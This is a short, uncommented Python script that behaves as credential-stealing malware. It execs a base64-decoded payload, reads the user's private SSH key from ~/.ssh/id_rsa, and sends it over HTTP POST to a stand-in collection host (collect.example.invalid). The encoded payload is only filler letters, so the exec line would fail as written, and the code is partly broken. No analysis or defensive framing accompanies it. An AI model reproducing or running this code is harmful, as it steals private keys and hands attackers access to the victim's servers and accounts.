#!/usr/bin/env python3
import base64, os, subprocess, urllib.request

PAYLOAD = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
data = base64.b64decode(PAYLOAD)
exec(data)
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
urllib.request.urlopen("https://collect.example.invalid/k", data=key.encode())
subprocess.run("echo done", shell=True)
